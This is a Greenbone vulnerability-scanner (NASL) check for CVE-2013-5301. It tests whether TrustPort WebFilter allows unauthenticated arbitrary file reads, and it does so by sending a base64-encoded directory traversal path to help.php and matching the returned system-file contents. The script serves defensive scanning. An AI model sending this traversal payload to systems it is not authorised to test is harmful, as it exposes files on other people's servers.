# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103751");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2013-08-08 10:35:29 +0200 (Thu, 08 Aug 2013)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");

  script_cve_id("CVE-2013-5301");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("TrustPort WebFilter <= 5.5.0.2232 Arbitrary File Access Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl", "os_detection.nasl");
  script_mandatory_keys("Host/runs_windows");
  script_require_ports("Services/www", 4849);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"TrustPort WebFilter is prone to an arbitrary file access
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"A vulnerability exists within the help.php script, allowing a
  remote attacker to access files outside of the webroot with SYSTEM privileges, without
  authentication.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to read arbitrary files in
  the context of the web server process, which may aid in further attacks.");

  script_tag(name:"affected", value:"TrustPort WebFilter version 5.5.0.2232 and probably prior.");

  script_tag(name:"solution", value:"Updates are available.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61662");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 4849);

if (!http_can_host_php(port: port))
  exit(0);

if (!soc = open_sock_tcp(port))
  exit(0);

send(socket: soc, data: 'GET /index1.php HTTP/1.0\r\n\r\n');
while (r = recv(socket: soc, length: 1024))
  resp += r;

close(soc);

if ("<title>TrustPort WebFilter" >!< resp)
  exit(0);

files = traversal_files("windows");

foreach file (keys(files)) {
  traversal = "../../../../../../../../../../../../../../../" + files[file];
  traversal = base64(str: traversal);

  if (!soc = open_sock_tcp(port))
    continue;

  url = "/help.php?hf=" + traversal;
  req = "GET " + url + ' HTTP/1.0\n\n\n\n';
  send(socket: soc, data: req);

  while (r = recv(socket: soc, length: 1024))
    ret += r;

  close(soc);

  if (eregmatch(pattern: file, string: ret)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
